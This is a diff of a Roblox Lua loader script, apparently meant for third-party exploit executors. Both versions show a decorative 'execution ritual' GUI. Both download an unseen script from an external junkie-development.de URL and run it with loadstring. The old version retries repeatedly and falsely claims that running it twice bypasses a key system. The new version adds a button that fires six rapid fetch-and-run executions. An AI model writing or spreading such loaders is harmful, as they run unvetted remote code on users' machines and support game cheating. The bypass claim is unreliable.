@@ -1,93 +1,88 @@
 local player = game.Players.LocalPlayer
 
 -- ===============================
--- WARNING GUI (SHOWS BEFORE MAIN RITUAL)
+-- PERMANENT DRAGGABLE RETRY BUTTON
 -- ===============================
-local warningGui = Instance.new("ScreenGui")
-warningGui.Name = "ExecutionWarning"
-warningGui.ResetOnSpawn = false
-warningGui.Parent = player:WaitForChild("PlayerGui")
+local retryGui = Instance.new("ScreenGui")
+retryGui.Name = "PermanentRetryButton"
+retryGui.ResetOnSpawn = false
+retryGui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
+retryGui.Parent = player:WaitForChild("PlayerGui")
 
-local warningFrame = Instance.new("Frame")
-warningFrame.Size = UDim2.new(0, 450, 0, 220)
-warningFrame.Position = UDim2.new(0.5, -225, 0.4, -110)
-warningFrame.BackgroundColor3 = Color3.fromRGB(20, 15, 25)
-warningFrame.BorderSizePixel = 0
-warningFrame.Parent = warningGui
+-- Main button frame
+local buttonFrame = Instance.new("Frame")
+buttonFrame.Size = UDim2.new(0, 220, 0, 50)
+buttonFrame.Position = UDim2.new(1, -240, 0.1, 0)
+buttonFrame.BackgroundColor3 = Color3.fromRGB(25, 10, 15)
+buttonFrame.BorderSizePixel = 0
+buttonFrame.Active = true
+buttonFrame.Selectable = true
+buttonFrame.Draggable = true
+buttonFrame.Parent = retryGui
 
-local warningCorner = Instance.new("UICorner")
-warningCorner.CornerRadius = UDim.new(0, 12)
-warningCorner.Parent = warningFrame
+local buttonCorner = Instance.new("UICorner")
+buttonCorner.CornerRadius = UDim.new(0, 8)
+buttonCorner.Parent = buttonFrame
 
-local warningStroke = Instance.new("UIStroke", warningFrame)
-warningStroke.Thickness = 4
-warningStroke.Color = Color3.fromRGB(255, 100, 100)
-warningStroke.Transparency = 0.2
-warningStroke.Parent = warningFrame
+local buttonStroke = Instance.new("UIStroke", buttonFrame)
+buttonStroke.Thickness = 2
+buttonStroke.Color = Color3.fromRGB(255, 80, 80)
+buttonStroke.Transparency = 0.2
+buttonStroke.Parent = buttonFrame
 
-local warningTitle = Instance.new("TextLabel")
-warningTitle.Size = UDim2.new(1, 0, 0, 50)
-warningTitle.Position = UDim2.new(0, 0, 0, 10)
-warningTitle.BackgroundTransparency = 1
-warningTitle.Font = Enum.Font.Garamond
-warningTitle.TextSize = 28
-warningTitle.TextColor3 = Color3.fromRGB(255, 100, 100)
-warningTitle.Text = "⚠ EXECUTION WARNING ⚠"
-warningTitle.TextStrokeTransparency = 0.6
-warningTitle.TextStrokeColor3 = Color3.fromRGB(10, 10, 12)
-warningTitle.Parent = warningFrame
+-- Retry Button
+local retryButton = Instance.new("TextButton")
+retryButton.Size = UDim2.new(1, -20, 1, -10)
+retryButton.Position = UDim2.new(0, 10, 0, 5)
+retryButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
+retryButton.BorderSizePixel = 0
+retryButton.Text = "Click Here If Gui Doesnt Show Up!"
+retryButton.Font = Enum.Font.Garamond
+retryButton.TextSize = 18
+retryButton.TextColor3 = Color3.fromRGB(255, 255, 255)
+retryButton.TextStrokeTransparency = 0.8
+retryButton.Parent = buttonFrame
 
-local warningText = Instance.new("TextLabel")
-warningText.Size = UDim2.new(1, -40, 0, 100)
-warningText.Position = UDim2.new(0, 20, 0, 60)
-warningText.BackgroundTransparency = 1
-warningText.TextWrapped = true
-warningText.Font = Enum.Font.Garamond
-warningText.TextSize = 18
-warningText.TextColor3 = Color3.fromRGB(220, 180, 180)
-warningText.Text = [[EXECUTION PROTOCOL ACTIVE:
+local innerButtonCorner = Instance.new("UICorner")
+innerButtonCorner.CornerRadius = UDim.new(0, 6)
+innerButtonCorner.Parent = retryButton
 
-• Script will attempt multiple executions
-• If first attempt fails, it will retry repeatedly
-• Successful double execution will bypass key systems
-• Prepare for aggressive loading sequence]]
-warningText.TextStrokeTransparency = 0.7
-warningText.Parent = warningFrame
+local innerButtonStroke = Instance.new("UIStroke", retryButton)
+innerButtonStroke.Thickness = 1
+innerButtonStroke.Color = Color3.fromRGB(255, 180, 180)
+innerButtonStroke.Transparency = 0.3
+innerButtonStroke.Parent = retryButton
 
-local warningStatus = Instance.new("TextLabel")
-warningStatus.Size = UDim2.new(1, -40, 0, 30)
-warningStatus.Position = UDim2.new(0, 20, 0, 170)
-warningStatus.BackgroundTransparency = 1
-warningStatus.Font = Enum.Font.Garamond
-warningStatus.TextSize = 16
-warningStatus.TextColor3 = Color3.fromRGB(255, 150, 100)
-warningStatus.Text = "Starting in: 5 seconds..."
-warningStatus.TextStrokeTransparency = 0.7
-warningStatus.Parent = warningFrame
+-- Close button
+local closeButton = Instance.new("TextButton")
+closeButton.Size = UDim2.new(0, 20, 0, 20)
+closeButton.Position = UDim2.new(1, -25, 0, -10)
+closeButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+closeButton.BorderSizePixel = 0
+closeButton.Text = "×"
+closeButton.Font = Enum.Font.Garamond
+closeButton.TextSize = 16
+closeButton.TextColor3 = Color3.new(1, 1, 1)
+closeButton.Parent = buttonFrame
 
--- Warning animation
-task.spawn(function()
-    local pulse = 0
-    while warningGui and warningGui.Parent do
-        pulse = (pulse + 0.15) % (math.pi * 2)
-        local glow = 0.2 + (math.sin(pulse) * 0.3)
-        warningStroke.Transparency = glow
-        task.wait(0.08)
-    end
-end)
+local closeCorner = Instance.new("UICorner")
+closeCorner.CornerRadius = UDim.new(1, 0)
+closeCorner.Parent = closeButton
 
 -- ===============================
--- MAIN GOTHIC EXECUTION GUI (WILL SHOW AFTER WARNING)
+-- GOTHIC GUI
 -- ===============================
-local mainGui = Instance.new("ScreenGui")
-mainGui.Name = "GothicExecutionWarning"
-mainGui.ResetOnSpawn = false
+local gui = Instance.new("ScreenGui")
+gui.Name = "GothicExecutionWarning"
+gui.ResetOnSpawn = false
+gui.Parent = player:WaitForChild("PlayerGui")
 
 local frame = Instance.new("Frame")
 frame.Size = UDim2.new(0, 420, 0, 180)
 frame.Position = UDim2.new(0.5, -210, 0.3, 0)
 frame.BackgroundColor3 = Color3.fromRGB(15, 12, 20)
 frame.BorderSizePixel = 0
+frame.Parent = gui
 
 local corner = Instance.new("UICorner")
 corner.CornerRadius = UDim.new(0, 16)
@@ -119,9 +114,7 @@ title.BackgroundTransparency = 1
 title.Font = Enum.Font.Garamond
 title.TextSize = 26
 title.TextColor3 = Color3.fromRGB(200, 170, 100)
-title.Text = "⚜ ULTIMATE EXECUTION RITUAL ⚜"
-title.TextStrokeTransparency = 0.7
-title.TextStrokeColor3 = Color3.fromRGB(10, 10, 12)
+title.Text = "⚜ EXECUTION RITUAL ⚜"
 title.Parent = frame
 
 local text = Instance.new("TextLabel")
@@ -132,8 +125,7 @@ text.TextWrapped = true
 text.Font = Enum.Font.Garamond
 text.TextSize = 18
 text.TextColor3 = Color3.fromRGB(180, 180, 185)
-text.Text = "Initiating ultimate execution sequence..."
-text.TextStrokeTransparency = 0.8
+text.Text = "Initiating ceremonial sequence..."
 text.Parent = frame
 
 local progress = Instance.new("TextLabel")
@@ -143,8 +135,7 @@ progress.BackgroundTransparency = 1
 progress.Font = Enum.Font.Garamond
 progress.TextSize = 16
 progress.TextColor3 = Color3.fromRGB(150, 130, 70)
-progress.Text = "Attempt: 1 • Execution: 0/4"
-progress.TextStrokeTransparency = 0.8
+progress.Text = "Phase: 1/3 • Step: 1/2"
 progress.Parent = frame
 
 local status = Instance.new("TextLabel")
@@ -154,233 +145,167 @@ status.BackgroundTransparency = 1
 status.Font = Enum.Font.Garamond
 status.TextSize = 14
 status.TextColor3 = Color3.fromRGB(120, 120, 120)
-status.Text = "Status: Beginning ultimate execution..."
-status.TextStrokeTransparency = 0.8
+status.Text = "Status: Beginning ritual..."
 status.Parent = frame
 
-local function createOrnament(posX, posY, anchorX, anchorY)
-    local ornament = Instance.new("Frame")
-    ornament.Size = UDim2.new(0, 12, 0, 12)
-    ornament.Position = UDim2.new(posX, 0, posY, 0)
-    ornament.AnchorPoint = Vector2.new(anchorX, anchorY)
-    ornament.BackgroundColor3 = Color3.fromRGB(200, 170, 100)
-    ornament.BackgroundTransparency = 0.5
-    ornament.BorderSizePixel = 0
-    ornament.Parent = frame
-    
-    local ornamentCorner = Instance.new("UICorner")
-    ornamentCorner.CornerRadius = UDim.new(0, 3)
-    ornamentCorner.Parent = ornament
-    
-    return ornament
-end
-
-createOrnament(0, 0, 0, 0)
-createOrnament(1, 0, 1, 0)
-createOrnament(0, 1, 0, 1)
-createOrnament(1, 1, 1, 1)
-
 -- ===============================
--- EXECUTION LOGIC WITH AGGRESSIVE RETRY
+-- ULTRA FAST EXECUTION FUNCTION
 -- ===============================
 local JUNKIE_URL = "https://api.junkie-development.de/api/v1/luascripts/public/3e73ebff1af450511d7cf0bda858517be15f5f269ac343792ac557701ce4a4f1/download"
 
--- Track execution success
-local totalSuccessfulExecutions = 0
-local totalAttemptsMade = 0
-local maxRetries = 10  -- Maximum number of retry attempts
-local bypassKeySystem = false  -- Will be set to true if we get double execution
-
--- Function to execute script with multiple fallbacks
-local function executeScriptWithRetry()
-    local methods = {
-        function() return loadstring(game:HttpGet(JUNKIE_URL))() end,
-        function() return loadstring(game:HttpGet(JUNKIE_URL, true))() end,
-        function() 
-            local HttpService = game:GetService("HttpService")
-            local response = HttpService:RequestAsync({Url = JUNKIE_URL, Method = "GET"})
-            if response.Success then return loadstring(response.Body)() end
-            return nil
-        end,
-        function()
-            if syn and syn.request then
-                local response = syn.request({Url = JUNKIE_URL, Method = "GET"})
-                if response.Success then return loadstring(response.Body)() end
-            end
-            return nil
-        end
-    }
+-- Super fast execution - no delays, just spam execution
+local function executeJunkieUltraFast(times)
+    print("🚀 ULTRA FAST EXECUTION STARTING: " .. times .. " times")
     
-    for _, method in ipairs(methods) do
-        totalAttemptsMade = totalAttemptsMade + 1
-        local success, result = pcall(method)
-        if success then
-            return true
-        end
+    local originalText = retryButton.Text
+    retryButton.Text = "🚀 " .. times .. "x"
+    retryButton.BackgroundColor3 = Color3.fromRGB(255, 150, 50)
+    
+    local successCount = 0
+    local totalAttempts = times
+    
+    -- SPAM EXECUTIONS WITH NO DELAYS
+    for i = 1, totalAttempts do
+        task.spawn(function()
+            local attemptSuccess = false
+            
+            -- Try multiple methods quickly
+            local methods = {
+                function()
+                    local content = game:HttpGet(JUNKIE_URL)
+                    if content then
+                        loadstring(content)()
+                        return true
+                    end
+                end,
+                function()
+                    local content = game:HttpGet(JUNKIE_URL, true)
+                    if content then
+                        loadstring(content)()
+                        return true
+                    end
+                end
+            }
+            
+            for _, method in ipairs(methods) do
+                local success, result = pcall(method)
+                if success then
+                    attemptSuccess = true
+                    break
+                end
+            end
+            
+            if attemptSuccess then
+                successCount = successCount + 1
+                print("⚡ Execution " .. i .. " succeeded")
+            else
+                print("❌ Execution " .. i .. " failed")
+            end
+        end)
+        
+        -- SUPER FAST: Only 0.01 second delay between spawning executions
+        task.wait(0.01)
     end
-    return false
+    
+    -- Wait a tiny bit for all to complete
+    task.wait(0.5)
+    
+    -- Update button with result
+    if successCount > 0 then
+        retryButton.Text = "✓ " .. successCount .. "/" .. totalAttempts
+        retryButton.BackgroundColor3 = Color3.fromRGB(100, 255, 100)
+        print("✅ FINAL: " .. successCount .. "/" .. totalAttempts .. " successful")
+    else
+        retryButton.Text = "✗ 0/" .. totalAttempts
+        retryButton.BackgroundColor3 = Color3.fromRGB(255, 100, 100)
+        print("❌ ALL FAILED")
+    end
+    
+    -- Quick restore
+    task.wait(1)
+    retryButton.Text = originalText
+    retryButton.BackgroundColor3 = Color3.fromRGB(255, 80, 80)
 end
 
--- Main execution function with aggressive retry
-local function performAggressiveExecution()
-    local maxExecutions = 4
-    local currentExecution = 0
-    local consecutiveSuccesses = 0
-    local currentRetry = 0
+-- Button click - ULTRA FAST 6x execution
+local isExecuting = false
+retryButton.MouseButton1Click:Connect(function()
+    if not isExecuting then
+        isExecuting = true
+        
+        -- Execute 6 times ULTRA FAST
+        executeJunkieUltraFast(6)
+        
+        isExecuting = false
+    end
+end)
+
+-- Close button
+closeButton.MouseButton1Click:Connect(function()
+    for i = 1, 15 do
+        local fade = i / 15
+        buttonFrame.BackgroundTransparency = fade
+        buttonStroke.Transparency = 0.2 + (fade * 0.8)
+        retryButton.BackgroundTransparency = fade
+        retryButton.TextTransparency = fade
+        innerButtonStroke.Transparency = 0.3 + (fade * 0.7)
+        closeButton.BackgroundTransparency = fade
+        closeButton.TextTransparency = fade
+        task.wait(0.03)
+    end
+    retryGui:Destroy()
+end)
+
+-- Animation pulse
+task.spawn(function()
+    local pulse = 0
+    while gui and gui.Parent do
+        pulse = (pulse + 0.05) % (math.pi * 2)
+        stroke.Transparency = 0.3 + (math.sin(pulse) * 0.2)
+        task.wait(0.1)
+    end
+end)
+
+-- Simple Gothic ritual
+local function performRitual()
+    local phases = 3
+    local stepsPerPhase = 2
     
-    -- Animation pulse for main GUI
+    -- Try to execute once at start
     task.spawn(function()
-        local pulse = 0
-        while mainGui and mainGui.Parent do
-            pulse = (pulse + 0.1) % (math.pi * 2)
-            local glow = 0.3 + (math.sin(pulse) * 0.2)
-            stroke.Transparency = glow
-            task.wait(0.05)
+        task.wait(1)
+        local success, _ = pcall(function()
+            local content = game:HttpGet(JUNKIE_URL)
+            if content then
+                loadstring(content)()
+            end
+        end)
+        
+        if success then
+            text.Text = "✓ Script loaded!"
+            stroke.Color = Color3.fromRGB(100, 255, 100)
+            task.wait(0.3)
+            stroke.Color = Color3.fromRGB(200, 170, 100)
         end
     end)
     
-    -- AGGRESSIVE EXECUTION LOOP
-    while currentExecution < maxExecutions and currentRetry < maxRetries do
-        currentExecution = currentExecution + 1
-        progress.Text = string.format("Attempt: %d • Execution: %d/%d • Retry: %d", 
-            currentExecution, currentExecution, maxExecutions, currentRetry)
-        title.Text = string.format("⚜ EXECUTION %d/%d ⚜", currentExecution, maxExecutions)
-        text.Text = "Executing script..."
-        status.Text = "Status: Running..."
-        status.TextColor3 = Color3.fromRGB(200, 170, 100)
+    for phase = 1, phases do
+        title.Text = string.format("⚜ PHASE %d/%d ⚜", phase, phases)
         
-        -- Try to execute
-        local success = executeScriptWithRetry()
-        
-        if success then
-            -- SUCCESS
-            text.Text = string.format("Execution %d successful!", currentExecution)
-            status.Text = "✓ Success!"
-            status.TextColor3 = Color3.fromRGB(100, 255, 100)
-            totalSuccessfulExecutions = totalSuccessfulExecutions + 1
-            consecutiveSuccesses = consecutiveSuccesses + 1
+        for step = 1, stepsPerPhase do
+            progress.Text = string.format("Phase: %d/%d • Step: %d/%d", phase, phases, step, stepsPerPhase)
             
-            -- Check for double execution success
-            if consecutiveSuccesses >= 2 then
-                bypassKeySystem = true
-                text.Text = "DOUBLE EXECUTION ACHIEVED!"
-                status.Text = "✓ Key system bypass activated!"
-                
-                -- Special effect for bypass
-                for i = 1, 5 do
-                    stroke.Color = Color3.fromRGB(100, 255, 100)
-                    task.wait(0.1)
-                    stroke.Color = Color3.fromRGB(200, 170, 100)
-                    task.wait(0.1)
-                end
-            end
-            
-            -- Success flash
-            stroke.Color = Color3.fromRGB(100, 255, 100)
-            task.wait(0.2)
-            stroke.Color = Color3.fromRGB(200, 170, 100)
-            currentRetry = 0  -- Reset retry counter on success
-            
-        else
-            -- FAILURE - PREPARE FOR RETRY
-            text.Text = string.format("Execution %d failed!", currentExecution)
-            status.Text = "✗ Failed! Preparing retry..."
-            status.TextColor3 = Color3.fromRGB(255, 100, 100)
-            consecutiveSuccesses = 0  -- Reset consecutive successes
-            
-            -- Error flash
-            for i = 1, 3 do
-                stroke.Color = Color3.fromRGB(255, 100, 100)
-                task.wait(0.1)
-                stroke.Color = Color3.fromRGB(200, 170, 100)
-                task.wait(0.1)
-            end
-            
-            -- Check if we should retry this execution
-            if currentRetry < maxRetries then
-                currentRetry = currentRetry + 1
-                currentExecution = currentExecution - 1  -- Stay on same execution number
-                
-                -- Show retry warning
-                text.Text = string.format("RETRYING... (Attempt %d/%d)", currentRetry, maxRetries)
-                status.Text = "⚠ Aggressive retry in progress..."
-                status.TextColor3 = Color3.fromRGB(255, 200, 100)
-                
-                -- Retry animation
-                for i = 1, 3 do
-                    stroke.Color = Color3.fromRGB(255, 200, 100)
-                    task.wait(0.2)
-                    stroke.Color = Color3.fromRGB(200, 170, 100)
-                    task.wait(0.2)
-                end
-            else
-                -- Max retries reached for this execution
-                status.Text = "✗ Max retries reached, moving on..."
-                status.TextColor3 = Color3.fromRGB(255, 150, 150)
-                currentRetry = 0  -- Reset for next execution
-            end
-        end
-        
-        -- Brief pause between execution attempts
-        if currentExecution < maxExecutions then
+            text.Text = "Executing sequence " .. step .. "..."
             task.wait(0.5)
         end
     end
     
-    -- FINAL RESULTS
-    title.Text = "⚜ EXECUTION COMPLETE ⚜"
-    progress.Text = string.format("Total: %d/%d successful", totalSuccessfulExecutions, maxExecutions)
+    title.Text = "⚜ COMPLETE ⚜"
+    text.Text = "USE THE BUTTON ON THE RIGHT CORNER"
+    progress.Text = "Top-right draggable button"
+    status.Text = "Click for ultra-fast execution"
     
-    if bypassKeySystem then
-        text.Text = "KEY SYSTEM BYPASSED!\nDouble execution successful!"
-        text.TextColor3 = Color3.fromRGB(100, 255, 100)
-        status.Text = "✓ No key required - Direct access granted!"
-        status.TextColor3 = Color3.fromRGB(100, 255, 100)
-    elseif totalSuccessfulExecutions > 0 then
-        text.Text = string.format("%d execution(s) successful", totalSuccessfulExecutions)
-        text.TextColor3 = Color3.fromRGB(255, 200, 100)
-        status.Text = "Partial success achieved"
-        status.TextColor3 = Color3.fromRGB(255, 200, 100)
-    else
-        text.Text = "All executions failed despite retries"
-        text.TextColor3 = Color3.fromRGB(255, 100, 100)
-        status.Text = "✗ Complete failure"
-        status.TextColor3 = Color3.fromRGB(255, 100, 100)
-    end
-    
-    -- Show final stats
-    task.wait(1)
-    text.Text = text.Text .. string.format("\nTotal attempts: %d", totalAttemptsMade)
-    if bypassKeySystem then
-        text.Text = text.Text .. "\n[KEY SYSTEM DISABLED]"
-    end
-    
-    -- Victory celebration
-    for i = 1, 15 do
-        if bypassKeySystem then
-            stroke.Color = Color3.fromHSV((i * 0.1) % 1, 0.9, 0.9)
-        else
-            stroke.Color = Color3.fromRGB(200, 170, 100)
-        end
-        
-        local scale = 1 + math.sin(i * 0.5) * 0.04
-        frame.Size = UDim2.new(0, 420 * scale, 0, 180 * scale)
-        frame.Position = UDim2.new(0.5, -210 * scale, 0.3, -90 * (scale - 1))
-        
-        task.wait(0.1)
-    end
-    
-    -- Reset size
-    frame.Size = UDim2.new(0, 420, 0, 180)
-    frame.Position = UDim2.new(0.5, -210, 0.3, 0)
-    
-    -- Final message
-    if bypassKeySystem then
-        text.Text = "SYSTEM UNLOCKED: Key requirement bypassed\nEnjoy unlimited access!"
-    end
-    
-    -- Fade out
-    task.wait(3)
+    task.wait(5)
     for i = 1, 20 do
         local fade = i / 20
         frame.BackgroundTransparency = fade
@@ -392,44 +317,11 @@ local function performAggressiveExecution()
         task.wait(0.03)
     end
     
-    -- Destroy GUIs
-    mainGui:Destroy()
+    gui:Destroy()
 end
 
--- ===============================
--- START THE EXECUTION SEQUENCE
--- ===============================
+-- Start ritual
 task.spawn(function()
-    -- Show warning first
-    for countdown = 5, 1, -1 do
-        warningStatus.Text = "Starting in: " .. countdown .. " seconds..."
-        task.wait(1)
-    end
-    
-    -- Fade out warning
-    for i = 1, 15 do
-        local fade = i / 15
-        warningFrame.BackgroundTransparency = fade
-        warningStroke.Transparency = 0.2 + (fade * 0.8)
-        warningTitle.TextTransparency = fade
-        warningText.TextTransparency = fade
-        warningStatus.TextTransparency = fade
-        task.wait(0.03)
-    end
-    
-    warningGui:Destroy()
-    
-    -- Show main execution GUI
-    mainGui.Parent = player.PlayerGui
-    
-    -- Fade in main GUI
-    frame.BackgroundTransparency = 1
-    stroke.Transparency = 1
-    text.TextTransparency = 1
-    title.TextTransparency = 1
-    progress.TextTransparency = 1
-    status.TextTransparency = 1
-    
     for i = 1, 10 do
         local fade = 1 - (i / 10)
         frame.BackgroundTransparency = fade
@@ -441,10 +333,10 @@ task.spawn(function()
         task.wait(0.02)
     end
     
-    -- Start aggressive execution
-    performAggressiveExecution()
+    performRitual()
 end)
 
-print("⚠ Execution warning displayed. Aggressive execution starting in 5 seconds...")
-print("Will retry up to " .. maxRetries .. " times per execution.")
-print("Double execution will bypass key system!")
+print("✅ ULTRA FAST RETRY BUTTON LOADED")
+print("⚡ Click 'EXECUTE 6x' button for ultra-fast execution")
+print("🚀 Executes 6 times with only 0.01s delays")
+print("📌 Draggable - move it anywhere")
